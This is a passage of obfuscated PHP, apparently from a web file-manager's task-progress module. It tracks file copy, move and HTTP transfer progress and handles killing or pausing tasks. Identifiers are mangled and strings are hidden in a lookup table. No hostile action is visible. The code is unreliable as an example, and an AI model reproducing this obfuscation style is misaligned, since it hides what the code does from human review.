($this->task[$®å¸ıÜê[1684]]) { self::valueSet($this->task[$®å¸ıÜê[399]], !1); } $this->isEnd = !0; if ($Ûø”½³) { $this->task[$®å¸ıÜê[462]] = $Ûø”½³; } self::log($®å¸ıÜê[1692] . $this->task[$®å¸ıÜê[399]] . $®å¸ıÜê[1693] . sprintf($®å¸ıÜê[863], timeFloat() - $this->task[$®å¸ıÜê[1682]]) . $®å¸ıÜê[1694]); Hook::unbind($®å¸ıÜê[1642], array($this, $®å¸ıÜê[1688])); Hook::unbind($®å¸ıÜê[1689], array($this, $®å¸ıÜê[1690])); $this->endAfter(); $è„ã··º = $this->task; $this->task = !1; Hook::trigger($®å¸ıÜê[1695], $è„ã··º); } public function update($Ôå¢ğç = 0, $şÎÔ†”­ = false) { $ÒšÂµù¥ =& $_SERVER[ï»»·÷á]; $ÛÎÌä¹ =& $this->task; if (!$ÛÎÌä¹) { return; } $ÛÎÌä¹[$ÒšÂµù¥[1679]] += $Ôå¢ğç; $ÛÎÌä¹[$ÒšÂµù¥[1683]] = timeFloat(); if ($ÛÎÌä¹[$ÒšÂµù¥[799]]) { if ($ÛÎÌä¹[$ÒšÂµù¥[799]] < $ÛÎÌä¹[$ÒšÂµù¥[1679]]) { $ÛÎÌä¹[$ÒšÂµù¥[799]] = $ÛÎÌä¹[$ÒšÂµù¥[1679]]; } $ı„±õÛè = timeFloat() - $ÛÎÌä¹[$ÒšÂµù¥[1682]] - $ÛÎÌä¹[$ÒšÂµù¥[1685]]; if ($ı„±õÛè <= 0) { $ı„±õÛè = 0.001; } $ÛÎÌä¹[$ÒšÂµù¥[1680]] = $ÛÎÌä¹[$ÒšÂµù¥[1679]] / $ÛÎÌä¹[$ÒšÂµù¥[799]]; $ÛÎÌä¹[$ÒšÂµù¥[1681]] = $ÛÎÌä¹[$ÒšÂµù¥[1679]] / $ı„±õÛè; if ($ÛÎÌä¹[$ÒšÂµù¥[1680]] > 0) { $ÛÎÌä¹[$ÒšÂµù¥[1686]] = $ı„±õÛè * (1 - $ÛÎÌä¹[$ÒšÂµù¥[1680]]) / $ÛÎÌä¹[$ÒšÂµù¥[1680]]; } $ÛÎÌä¹[$ÒšÂµù¥[1686]] = $ÛÎÌä¹[$ÒšÂµù¥[1686]] <= 0 ? 0 : $ÛÎÌä¹[$ÒšÂµù¥[1686]]; } $this->updateAfter(); $ÙªæÌµ­ = 0.2; if (timeFloat() - $ÛÎÌä¹[$ÒšÂµù¥[1684]] < $ÙªæÌµ­ && !$şÎÔ†”­) { return; } $ŸÄŞÁ‡û = self::get($ÛÎÌä¹[$ÒšÂµù¥[399]]); $‘ô¹€ËÅ = $ŸÄŞÁ‡û[$ÒšÂµù¥[762]]; if ($‘ô¹€ËÅ == self::STATYS_KILL) { $ˆ§‡†« = array($ÒšÂµù¥[1696] => LNG($ÒšÂµù¥[1697]), $ÒšÂµù¥[1222] => !1); Cache::set($ÒšÂµù¥[1698] . $this->task[$ÒšÂµù¥[399]], $ˆ§‡†«, 30); $this->onKill(); $this->end(); die; } else { if ($‘ô¹€ËÅ == self::STATYS_STOP) { $ìóÁˆİ÷ = 2; $ŸÄŞÁ‡û[$ÒšÂµù¥[1685]] += $ìóÁˆİ÷; self::valueSet($ÛÎÌä¹[$ÒšÂµù¥[399]], $ŸÄŞÁ‡û); sleep($ìóÁˆİ÷); $this->update(); return; } } $ÛÎÌä¹[$ÒšÂµù¥[762]] = $‘ô¹€ËÅ ? $‘ô¹€ËÅ : $ÛÎÌä¹[$ÒšÂµù¥[762]]; $ÛÎÌä¹[$ÒšÂµù¥[1685]] = $ŸÄŞÁ‡û[$ÒšÂµù¥[1685]] ? $ŸÄŞÁ‡û[$ÒšÂµù¥[1685]] : 0; $ÛÎÌä¹[$ÒšÂµù¥[1684]] = timeFloat(); Hook::trigger($ÒšÂµù¥[1699], $ÛÎÌä¹); self::valueSet($ÛÎÌä¹[$ÒšÂµù¥[399]], $ÛÎÌä¹); } public function onKillSet($æ¼Œù•”, $Ê²‹å = array()) { $this->onKillCall = array($æ¼Œù•”, $Ê²‹å); } public function onKill() { $íŸÌÈŒ½ =& $_SERVER[ï»»·÷á]; self::log($íŸÌÈŒ½[1692] . $this->task[$íŸÌÈŒ½[399]] . $íŸÌÈŒ½[1700]); Hook::trigger($íŸÌÈŒ½[1701], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Õ”®¢‹›) { $¥«µ°¨Ò =& $_SERVER[ï»»·÷á]; Cache::set($¥«µ°¨Ò[1698] . $this->task[$¥«µ°¨Ò[399]], $Õ”®¢‹›, 60); return $Õ”®¢‹›; } public static function get($¡óä²¡‘) { $‘ò…œÎØ =& $_SERVER[ï»»·÷á]; $é÷¼åûÑ = self::valueGet($¡óä²¡‘); if (is_array($é÷¼åûÑ) && $é÷¼åûÑ[$‘ò…œÎØ[1702]]) { $‚œšÆ¬î = ActionApply($é÷¼åûÑ[$‘ò…œÎØ[1702]], array($é÷¼åûÑ)); $é÷¼åûÑ = is_array($‚œšÆ¬î) ? $‚œšÆ¬î : $é÷¼åûÑ; } return $é÷¼åûÑ; } public static function listData() { $ã ”ÜÉ¿ = self::valueGet(); return array_sort_by($ã ”ÜÉ¿, $_SERVER[ï»»·÷á][1682], !0); } public static function kill($ÉË¯ÛïÕ) { return self::changeStatus($ÉË¯ÛïÕ, self::STATYS_KILL); } public static function stop($µ©ê–™‚) { return self::changeStatus($µ©ê–™‚, self::STATYS_STOP); } public static function restart($Á£í÷×²) { return self::changeStatus($Á£í÷×², self::STATYS_RUNNING); } public static function killAll() { $¸áìÁà =& $_SERVER[ï»»·÷á]; $»šÉ¬ = self::listData(); foreach ($»šÉ¬ as $¨ªŒşŒÏ) { self::kill($¨ªŒşŒÏ[$¸áìÁà[399]]); } sleep(2); foreach ($»šÉ¬ as $¨ªŒşŒÏ) { self::valueSet($¨ªŒşŒÏ[$¸áìÁà[399]], !1); } } private static function changeStatus($§í…Î, $ŒÛ¹Øéû) { $¿£“·êß =& $_SERVER[ï»»·÷á]; $òÙûÆ©á = self::valueGet($§í…Î); if (!$òÙûÆ©á) { return !1; } $òÙûÆ©á[$¿£“·êß[762]] = $ŒÛ¹Øéû; self::valueSet($§í…Î, $òÙûÆ©á); self::log($¿£“·êß[1703] . $òÙûÆ©á[$¿£“·êß[399]] . $¿£“·êß[1704] . $ŒÛ¹Øéû); return !0; } public static function valueGet($úúÁïÊÚ = false) { $ºøœĞµ =& $_SERVER[ï»»·÷á]; if ($úúÁïÊÚ) { $ÂÑ¦Ğ™’ = Model($ºøœĞµ[456])->where(array($ºøœĞµ[94] => $úúÁïÊÚ, $ºøœĞµ[33] => $ºøœĞµ[1081]))->find(); return $ÂÑ¦Ğ™’ ? json_decode($ÂÑ¦Ğ™’[$ºøœĞµ[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($öªˆÂ¨Õ = false) { $¡ŸÕêí× =& $_SERVER[ï»»·÷á]; $øàÒÒÛÂ = array($¡ŸÕêí×[33] => $¡ŸÕêí×[1081]); if ($öªˆÂ¨Õ) { $øàÒÒÛÂ[$¡ŸÕêí×[1678]] = $öªˆÂ¨Õ; } $Éö£Òî = Model($¡ŸÕêí×[456])->where($øàÒÒÛÂ)->select(); $Éö£Òî = $Éö£Òî ? $Éö£Òî : array(); foreach ($Éö£Òî as $‰ëİÃ‡ˆ => $µĞ¨”›˜) { $Éö£Òî[$‰ëİÃ‡ˆ] = json_decode($µĞ¨”›˜[$¡ŸÕêí×[374]], !0); } return $Éö£Òî; } public static function valueSet($Âïä™÷Ÿ, $üÂ¼«î•) { $Šøæ±Øï =& $_SERVER[ï»»·÷á]; if (!$üÂ¼«î•) { return Model($Šøæ±Øï[456])->where(array($Šøæ±Øï[94] => $Âïä™÷Ÿ, $Šøæ±Øï[33] => $Šøæ±Øï[1081]))->delete(); } $ËÀíãş = json_encode($üÂ¼«î•); if (!$ËÀíãş) { ob_start(); var_dump($üÂ¼«î•); $™‚·š›© = ob_get_clean(); self::log($Šøæ±Øï[1705] . json_encode_force($™‚·š›©)); } if (!$Âïä™÷Ÿ || !$üÂ¼«î•[$Šøæ±Øï[399]]) { return !1; } $¡Æıì¡ = array($Šøæ±Øï[33] => $Šøæ±Øï[1081], $Šøæ±Øï[1678] => USER_ID, $Šøæ±Øï[94] => $Âïä™÷Ÿ, $Šøæ±Øï[374] => $ËÀíãş); $âÖè™ = $Šøæ±Øï[1706]; CacheLock::lock($âÖè™); Model($Šøæ±Øï[456])->add($¡Æıì¡, array(), !0); CacheLock::unlock($âÖè™); } public static function log($ì¦ñŞÂ) { if (!GLOBAL_DEBUG) { return; } write_log($ì¦ñŞÂ, $_SERVER[ï»»·÷á][1707]); } } class TaskFileTransfer extends Task { protected function startAfter() { $›½¿ã¯” =& $_SERVER[ï»»·÷á]; $­¯Á£è² =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($›½¿ã¯”[1708], array($this, $›½¿ã¯”[1709])); Hook::bind($›½¿ã¯”[1233], array($this, $›½¿ã¯”[1710])); Hook::bind($›½¿ã¯”[1711], array($this, $›½¿ã¯”[1712])); Hook::bind($›½¿ã¯”[605], array($this, $›½¿ã¯”[1713])); Hook::bind($›½¿ã¯”[606], array($this, $›½¿ã¯”[1714])); Hook::bind($›½¿ã¯”[611], array($this, $›½¿ã¯”[1715])); Hook::bind($›½¿ã¯”[612], array($this, $›½¿ã¯”[1716])); Hook::bind($›½¿ã¯”[608], array($this, $›½¿ã¯”[1717])); Hook::bind($›½¿ã¯”[609], array($this, $›½¿ã¯”[1718])); Hook::bind($›½¿ã¯”[574], array($this, $›½¿ã¯”[1719])); Hook::bind($›½¿ã¯”[571], array($this, $›½¿ã¯”[1719])); Hook::bind($›½¿ã¯”[576], array($this, $›½¿ã¯”[1719])); Hook::bind($›½¿ã¯”[578], array($this, $›½¿ã¯”[1719])); Hook::bind($›½¿ã¯”[580], array($this, $›½¿ã¯”[1719])); Hook::bind($›½¿ã¯”[1720], array($this, $›½¿ã¯”[1721])); Hook::bind($›½¿ã¯”[596], array($this, $›½¿ã¯”[1722])); $this->sourceModelCopyFlag = !1; Hook::bind($›½¿ã¯”[1723], array($this, $›½¿ã¯”[1724])); Hook::bind($›½¿ã¯”[1725], array($this, $›½¿ã¯”[1726])); Hook::bind($›½¿ã¯”[1727], array($this, $›½¿ã¯”[1728])); $­¯Á£è²[$›½¿ã¯”[1729]] = LNG($›½¿ã¯”[1730]); $­¯Á£è²[$›½¿ã¯”[1731]] = 0; $­¯Á£è²[$›½¿ã¯”[1732]] = 0; $­¯Á£è²[$›½¿ã¯”[1074]] = $›½¿ã¯”[12]; $­¯Á£è²[$›½¿ã¯”[1733]] = $›½¿ã¯”[12]; $­¯Á£è²[$›½¿ã¯”[1734]] = 0; $­¯Á£è²[$›½¿ã¯”[1735]] = 0; $­¯Á£è²[$›½¿ã¯”[1736]] = 0; if (!$­¯Á£è²[$›½¿ã¯”[1576]]) { $­¯Á£è²[$›½¿ã¯”[1576]] = LNG($›½¿ã¯”[1737]); } } protected function endAfter() { $§úØˆŸú =& $_SERVER[ï»»·÷á]; Hook::unbind($§úØˆŸú[1708], array($this, $§úØˆŸú[1709])); Hook::unbind($§úØˆŸú[1233], array($this, $§úØˆŸú[1710])); Hook::unbind($§úØˆŸú[1711], array($this, $§úØˆŸú[1712])); Hook::unbind($§úØˆŸú[605], array($this, $§úØˆŸú[1713])); Hook::unbind($§úØˆŸú[606], array($this, $§úØˆŸú[1714])); Hook::unbind($§úØˆŸú[611], array($this, $§úØˆŸú[1715])); Hook::unbind($§úØˆŸú[612], array($this, $§úØˆŸú[1716])); Hook::unbind($§úØˆŸú[608], array($this, $§úØˆŸú[1717])); Hook::unbind($§úØˆŸú[609], array($this, $§úØˆŸú[1718])); Hook::unbind($§úØˆŸú[574], array($this, $§úØˆŸú[1719])); Hook::unbind($§úØˆŸú[571], array($this, $§úØˆŸú[1719])); Hook::unbind($§úØˆŸú[576], array($this, $§úØˆŸú[1719])); Hook::unbind($§úØˆŸú[578], array($this, $§úØˆŸú[1719])); Hook::unbind($§úØˆŸú[580], array($this, $§úØˆŸú[1719])); Hook::unbind($§úØˆŸú[1720], array($this, $§úØˆŸú[1721])); Hook::unbind($§úØˆŸú[596], array($this, $§úØˆŸú[1722])); Hook::unbind($§úØˆŸú[1723], array($this, $§úØˆŸú[1724])); Hook::unbind($§úØˆŸú[1725], array($this, $§úØˆŸú[1726])); Hook::unbind($§úØˆŸú[1727], array($this, $§úØˆŸú[1728])); } public function copyMoveStart($÷‡ò…ùî, $ŸÓéœŸ¶, $¡àÄ‡ú†, $æñ»¼Êï) { $â¸ÓÁ… =& $_SERVER[ï»»·÷á]; self::log($â¸ÓÁ…[1738] . $ŸÓéœŸ¶ . $â¸ÓÁ…[70] . $æñ»¼Êï); $ê»ø‚È = rtrim(TEMP_FILES, $â¸ÓÁ…[8]); if (substr($ŸÓéœŸ¶, 0, strlen($ê»ø‚È)) == $ê»ø‚È) { return; } if (substr($æñ»¼Êï, 0, strlen($ê»ø‚È)) == $ê»ø‚È) { return; } $ë×ğ„¡… =& $this->task; $ë×ğ„¡…[$â¸ÓÁ…[1739]] = KodIO::transferType($÷‡ò…ùî, $¡àÄ‡ú†); $this->update(); } public function updateAfter() { $®Ò¸÷Š€ =& $_SERVER[ï»»·÷á]; $­ù¿•ì‹ =& $this->task; if (!$­ù¿•ì‹[$®Ò¸÷Š€[776]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($­ù¿•ì‹[$®Ò¸÷Š€[1739]] == $®Ò¸÷Š€[1322]) { return; } self::updateTask($­ù¿•ì‹); } private static function updateTask(&$å–ÄÆŞ¦) { $¯Ş–óø¿ =& $_SERVER[ï»»·÷á]; if ($å–ÄÆŞ¦[$¯Ş–óø¿[1739]] == $¯Ş–óø¿[1204] || $å–ÄÆŞ¦[$¯Ş–óø¿[1739]] == $¯Ş–óø¿[107]) { if ($å–ÄÆŞ¦[$¯Ş–óø¿[1733]]) { $å–ÄÆŞ¦[$¯Ş–óø¿[1736]] = $å–ÄÆŞ¦[$¯Ş–óø¿[1735]] + $å–ÄÆŞ¦[$¯Ş–óø¿[1732]]; } } else { if ($å–ÄÆŞ¦[$¯Ş–óø¿[1739]] == $¯Ş–óø¿[1323]) { if ($å–ÄÆŞ¦[$¯Ş–óø¿[1733]] == $¯Ş–óø¿[1204]) { $å–ÄÆŞ¦[$¯Ş–óø¿[1736]] = $å–ÄÆŞ¦[$¯Ş–óø¿[1735]] + $å–ÄÆŞ¦[$¯Ş–óø¿[1732]] * 0.5; } else { if ($å–ÄÆŞ¦[$¯Ş–óø¿[1733]] == $¯Ş–óø¿[107]) { $å–ÄÆŞ¦[$¯Ş–óø¿[1736]] = $å–ÄÆŞ¦[$¯Ş–óø¿[1735]] + $å–ÄÆŞ¦[$¯Ş–óø¿[1731]] * 0.5 + $å–ÄÆŞ¦[$¯Ş–óø¿[1732]] * 0.5; } } } } $å–ÄÆŞ¦[$¯Ş–óø¿[1680]] = $å–ÄÆŞ¦[$¯Ş–óø¿[1736]] / $å–ÄÆŞ¦[$¯Ş–óø¿[776]]; if ($å–ÄÆŞ¦[$¯Ş–óø¿[1680]] > 0) { $°×ÔïÒÜ = timeFloat() - $å–ÄÆŞ¦[$¯Ş–óø¿[1682]] - $å–ÄÆŞ¦[$¯Ş–óø¿[1685]]; $å–ÄÆŞ¦[$¯Ş–óø¿[1686]] = $°×ÔïÒÜ * (1 - $å–ÄÆŞ¦[$¯Ş–óø¿[1680]]) / $å–ÄÆŞ¦[$¯Ş–óø¿[1680]]; } } public function addPath($¢Ä˜œê¹) { $ï‘Ú‚¥‚ =& $_SERVER[ï»»·÷á]; if (!$¢Ä˜œê¹) { return; } $·è£»§› =& $this->task; $éËˆ Ç„ = IO::infoWithChildren($¢Ä˜œê¹); $®–üŸ£œ = $·è£»§›[$ï‘Ú‚¥‚[1740]] ? $·è£»§›[$ï‘Ú‚¥‚[1740]][$ï‘Ú‚¥‚[1741]] : 0; $·è£»§›[$ï‘Ú‚¥‚[1740]] = array($ï‘Ú‚¥‚[1741] => $®–üŸ£œ + 1, $ï‘Ú‚¥‚[429] => $éËˆ Ç„[$ï‘Ú‚¥‚[32]], $ï‘Ú‚¥‚[84] => $éËˆ Ç„[$ï‘Ú‚¥‚[84]], $ï‘Ú‚¥‚[518] => $éËˆ Ç„[$ï‘Ú‚¥‚[518]] ? $éËˆ Ç„[$ï‘Ú‚¥‚[518]] : $éËˆ Ç„[$ï‘Ú‚¥‚[84]]); if ($éËˆ Ç„[$ï‘Ú‚¥‚[33]] == $ï‘Ú‚¥‚[200]) { $·è£»§›[$ï‘Ú‚¥‚[799]] += 1; } else { $·è£»§›[$ï‘Ú‚¥‚[799]] += $éËˆ Ç„[$ï‘Ú‚¥‚[79]][$ï‘Ú‚¥‚[77]]; if ($éËˆ Ç„[$ï‘Ú‚¥‚[411]]) { $·è£»§›[$ï‘Ú‚¥‚[799]] += $éËˆ Ç„[$ï‘Ú‚¥‚[79]][$ï‘Ú‚¥‚[78]] + 1; } } $·è£»§›[$ï‘Ú‚¥‚[776]] += $éËˆ Ç„[$ï‘Ú‚¥‚[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¯î‰«Å) { } public function sourceAddHashEnd($˜·æÈÉ) { } public function sourceAddFileStart($„¼±’­è) { $°Ó»¦Š =& $_SERVER[ï»»·÷á]; $½ê‚Û”è =& $this->task; $½ê‚Û”è[$°Ó»¦Š[1731]] = $„¼±’­è[$°Ó»¦Š[76]]; $½ê‚Û”è[$°Ó»¦Š[1729]] = $„¼±’­è[$°Ó»¦Š[32]]; $½ê‚Û”è[$°Ó»¦Š[1074]] = $„¼±’­è[$°Ó»¦Š[32]]; $½ê‚Û”è[$°Ó»¦Š[1742]] = $„¼±’­è[$°Ó»¦Š[84]]; $this->update(); } public function sourceAddFileEnd($İ³ÇÇ€Æ) { $µ¹ÅÄæË =& $_SERVER[ï»»·÷á]; $µİ‚èğ =& $this->task; $µİ‚èğ[$µ¹ÅÄæË[1736]] += $İ³ÇÇ€Æ[$µ¹ÅÄæË[76]]; $µİ‚èğ[$µ¹ÅÄæË[1742]] = $İ³ÇÇ€Æ[$µ¹ÅÄæË[84]]; $this->update(1); } public function copyFileStart($¦ÅÌ°É, $Ù‘Ó”œ¤, $é«îø¨, $ï¸´¿¢¿, $ù®ß´ˆù, $ª½ÂÏ‘ï) { $òäÜŠà =& $_SERVER[ï»»·÷á]; $¸æùÅ = $ù®ß´ˆù; if ($¸æùÅ == $GLOBALS[$òäÜŠà[1743]]) { $¸æùÅ = $GLOBALS[$òäÜŠà[1744]]; } $GLOBALS[$òäÜŠà[1744]] = $ù®ß´ˆù; $GLOBALS[$òäÜŠà[1743]] = $ª½ÂÏ‘ï; $ã’Ñ® =& $this->task; $ã’Ñ®[$òäÜŠà[1729]] = $¸æùÅ; $ã’Ñ®[$òäÜŠà[1731]] = (int) $¦ÅÌ°É->size($Ù‘Ó”œ¤); $ã’Ñ®[$òäÜŠà[1732]] = 0; $ã’Ñ®[$òäÜŠà[1074]] = $òäÜŠà[12]; $ã’Ñ®[$òäÜŠà[1733]] = $òäÜŠà[12]; $ã’Ñ®[$òäÜŠà[1734]] = 0; $ÃÈ®ş”‘ = $ã’Ñ®[$òäÜŠà[1731]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ã’Ñ®[$òäÜŠà[399]] . $òäÜŠà[1745]); if ($ÃÈ®ş”‘ && file_exists(get_path_father($ï¸´¿¢¿))) { Cache::set($ã’Ñ®[$òäÜŠà[399]] . $òäÜŠà[1745], $ï¸´¿¢¿); $ã’Ñ®[$òäÜŠà[1702]] = array($òäÜŠà[1746], $òäÜŠà[1747]); } $this->update(0, $ÃÈ®ş”‘); } public static function updateCopyLocalFileSize($¾èÂš) { $«ª–ŒĞ =& $_SERVER[ï»»·÷á]; $½¨¡ÀµÒ = Cache::get($¾èÂš[$«ª–ŒĞ[399]] . $«ª–ŒĞ[1745]); if (!$½¨¡ÀµÒ || !file_exists($½¨¡ÀµÒ)) { return $¾èÂš; } $¾èÂš[$«ª–ŒĞ[1732]] = @filesize($½¨¡ÀµÒ); $¾èÂš[$«ª–ŒĞ[1736]] += $¾èÂš[$«ª–ŒĞ[1732]]; self::updateTask($¾èÂš); return $¾èÂš; } public function copyFileEnd($óì‡œ…, $·‘¥ˆ®ö, $ÅÇ°£Şé, $ïÕ¾Ö²Ÿ, $àèş¿, $¢Ö¤Ÿ™) { $ÃØÀôÒ¸ =& $_SERVER[ï»»·÷á]; $£Ï•¾ÎÓ =& $this->task; $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1732]] = $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1731]]; $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1733]] = $ÃØÀôÒ¸[12]; unset($£Ï•¾ÎÓ[$ÃØÀôÒ¸[1702]]); if ($àèş¿ == $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1729]]) { $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1735]] += $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1731]]; $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1736]] = $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1735]]; $¦ÚÏÛßŞ = 1; if (isset($£Ï•¾ÎÓ[$ÃØÀôÒ¸[1742]]) && $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1742]] == $·‘¥ˆ®ö) { $¦ÚÏÛßŞ = 0; } $this->update($¦ÚÏÛßŞ); } else { $this->update(); $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1732]] = 0; } Cache::remove($£Ï•¾ÎÓ[$ÃØÀôÒ¸[399]] . $ÃØÀôÒ¸[1745]); self::log($ÃØÀôÒ¸[1748] . $·‘¥ˆ®ö . $ÃØÀôÒ¸[70] . $ïÕ¾Ö²Ÿ . $ÃØÀôÒ¸[231] . $àèş¿ . $ÃØÀôÒ¸[1749] . $£Ï•¾ÎÓ[$ÃØÀôÒ¸[1729]]); } public function updateFileEnd($ä„–Úºõ, $Çğ×óÙº) { $ÒÔº–æª =& $_SERVER[ï»»·÷á]; $ˆ¨Ëš¡° =& $this->task; $ˆ¨Ëš¡°[$ÒÔº–æª[1729]] = $ä„–Úºõ; $ˆ¨Ëš¡°[$ÒÔº–æª[1731]] = $Çğ×óÙº; $ˆ¨Ëš¡°[$ÒÔº–æª[1735]] += $Çğ×óÙº; $ˆ¨Ëš¡°[$ÒÔº–æª[1736]] = $ˆ¨Ëš¡°[$ÒÔº–æª[1735]]; $this->update(1); self::log($ÒÔº–æª[1750] . $ä„–Úºõ); } public function sourceModelCopy($”ñŒşº) { $½®„÷ä =& $_SERVER[ï»»·÷á]; $¸Ç¦ñ® = $”ñŒşº[0]; $´Àî…ë = $”ñŒşº[1]; $™²Œà­ =& $this->task; $this->sourceModelCopyFlag = !0; $€ÒÌ©¸ = 0; switch ($¸Ç¦ñ®) { case $½®„÷ä[572]: $€ÒÌ©¸ = 1; break; case $½®„÷ä[575]: $™²Œà­[$½®„÷ä[1729]] = $´Àî…ë[$½®„÷ä[32]]; break; case $½®„÷ä[577]: $€ÒÌ©¸ = intval($”ñŒşº[$½®„÷ä[380]] * 0.4); break; case $½®„÷ä[579]: $€ÒÌ©¸ = intval($”ñŒşº[$½®„÷ä[380]] * 0.2); break; case $½®„÷ä[581]: $€ÒÌ©¸ = intval($”ñŒşº[$½®„÷ä[380]] * 0.4); break; } $this->update($€ÒÌ©¸); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Û„ùÁœú, $ƒñÚ®ñî) { $‚í«Ïôë =& $_SERVER[ï»»·÷á]; $this->sourceModelCopyFlag = !0; $—«”ğ† = 1; if (isset($Û„ùÁœú[$‚í«Ïôë[79]])) { $—«”ğ† = $Û„ùÁœú[$‚í«Ïôë[79]][$‚í«Ïôë[77]]; $—«”ğ† = $—«”ğ† + $Û„ùÁœú[$‚í«Ïôë[79]][$‚í«Ïôë[78]] + 1; } $this->update($—«”ğ†); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÏÈ‹ºŞ) { $this->sourceRemove($ÏÈ‹ºŞ, !1); } public function curlProgress($•ìÒç, $€‘üÄœ, $±³»ñ¢¯, $ù©½Ëº, $£†¾ñÃ‘) { $˜í±–’ª =& $_SERVER[ï»»·÷á]; $îª•ÄÈƒ =& $this->task; if ($£†¾ñÃ‘ > 0) { $îª•ÄÈƒ[$˜í±–’ª[1074]] = $˜í±–’ª[1751]; $îª•ÄÈƒ[$˜í±–’ª[1733]] = $˜í±–’ª[107]; if ($îª•ÄÈƒ[$˜í±–’ª[1731]]) { $îª•ÄÈƒ[$˜í±–’ª[1732]] = $£†¾ñÃ‘; } if ($îª•ÄÈƒ[$˜í±–’ª[1734]]) { $îª•ÄÈƒ[$˜í±–’ª[1732]] = $£†¾ñÃ‘ + $îª•ÄÈƒ[$˜í±–’ª[1734]]; } } else { if ($±³»ñ¢¯ > 0) { if ($îª•ÄÈƒ[$˜í±–’ª[1731]] == $€‘üÄœ) { $îª•ÄÈƒ[$˜í±–’ª[1732]] = $±³»ñ¢¯; $îª•ÄÈƒ[$˜í±–’ª[1074]] = $˜í±–’ª[1752]; $îª•ÄÈƒ[$˜í±–’ª[1733]] = $˜í±–’ª[1204]; } } } $this->update(); } public function curlProgressStart($ùæ¬Ø„) { } public function curlProgressEnd($ñêÔÙçÍ) { $ÛêÜ”·Ç =& $_SERVER[ï»»·÷á]; $‚ğ“ÜÈé =& $this->task; $œáñ§½¤ = curl_getinfo($ñêÔÙçÍ); $ùËùÎ¸ = $œáñ§½¤[$ÛêÜ”·Ç[1753]]; if ($ùËùÎ¸ == -1) { $ùËùÎ¸ = $œáñ§½¤[$ÛêÜ”·Ç[1754]]; } if ($‚ğ“ÜÈé[$ÛêÜ”·Ç[1733]] == $ÛêÜ”·Ç[107] && $ùËùÎ¸) { $‚ğ“ÜÈé[$ÛêÜ”·Ç[1734]] += $ùËùÎ¸; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Ë‚–‰ =& $_SERVER[ï»»·÷á]; $Íª‘ ˆÇ =& $this->task; $Íª‘ ˆÇ[$Ë‚–‰[1755]] = 1; Hook::bind($Ë‚–‰[1723], array($this, $Ë‚–‰[1756])); Hook::bind($Ë‚–‰[1725], array($this, $Ë‚–‰[1757])); Hook::bind($Ë‚–‰[1727], array($this, $Ë‚–‰[1758])); } protected function endAfter() { $©ÏÓÕŠ° =& $_SERVER[ï»»·÷á]; Hook::unbind($©ÏÓÕŠ°[1723], array($this, $©ÏÓÕŠ°[1756])); Hook::unbind($©ÏÓÕŠ°[1725], array($this, $©ÏÓÕŠ°[1757])); Hook::unbind($©ÏÓÕŠ°[1727], array($this, $©ÏÓÕŠ°[1758])); } public function progressStart($—Ä„úÑî) { $¼¹‹ˆç =& $_SERVER[ï»»·÷á]; $ôÇ‡œËÃ = curl_getinfo($—Ä„úÑî); self::log($¼¹‹ˆç[1759] . $ôÇ‡œËÃ[$¼¹‹ˆç[307]]); self::valueSet($this->task[$¼¹‹ˆç[399]], $this->task); } public function progressEnd($ïíá‘Üµ) { $îõ’€÷ó =& $_SERVER[ï»»·÷á]; self::log($îõ’€÷ó[1760] . $this->task[$îõ’€÷ó[399]]); $this->end(); } public function progress($ğÅ—¿êÆ, $Íñû¾ÆŸ, $İÍÌÇî§, $¾ìîêÅ¦, $êï‚×É) { $»²ì©Ä =& $_SERVER[ï»»·÷á]; $ò¤¦„Û‚ =& $this->task; if ($êï‚×É > 0) { $ò¤¦„Û‚[$»²ì©Ä[799]] = $ò¤¦„Û‚[$»²ì©Ä[799]] == 0 ? $¾ìîêÅ¦ : $ò¤¦„Û‚[$»²ì©Ä[799]]; $ò¤¦„Û‚[$»²ì©Ä[1679]] = $êï‚×É; } else { if ($İÍÌÇî§ > 0) { $ò¤¦„Û‚[$»²ì©Ä[799]] = $ò¤¦„Û‚[$»²ì©Ä[799]] == 0 ? $Íñû¾ÆŸ : $ò¤¦„Û‚[$»²ì©Ä[799]]; $ò¤¦„Û‚[$»²ì©Ä[1679]] = $İÍÌÇî§; } } $this->update(); self::log("\x70\162\157\147\x72\145\x73\x73\110\164\164\x70\72\x64\x6f\167\156\72{$İÍÌÇî§}\57{$Íñû¾ÆŸ}\x3b\40\x75\160\x6c\x6f\x61\x64\x3a{$êï‚×É}\x2f{$¾ìîêÅ¦}\73"); } } goto aôïì—…ƒß; aõ‡£¶’ÈË: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ºæ£”Å£) { $÷İà´ =& $_SERVER[ï»»·÷á]; if (!$this->allowLock()) { return; } $this->_lockCheck($÷İà´[555], $ºæ£”Å£); $œÖø‰Û± = 1; $this->_lockEvent($ºæ£”Å£, array($÷İà´[556], $÷İà´[557]), $œÖø‰Û±); $this->_lockParent($ºæ£”Å£, array($÷İà´[557]), $œÖø‰Û±); $this->_lockEvent($ºæ£”Å£, array($÷İà´[558], $÷İà´[559]), $œÖø‰Û±); $this->_lockCheckEnd($÷İà´[555], $ºæ£”Å£); } public function lockCopyEnd($ãöóÛàù) { $ş·”áö² =& $_SERVER[ï»»·÷á]; if (!$this->allowLock()) { return; } $‹Ñå™Áö = 0; 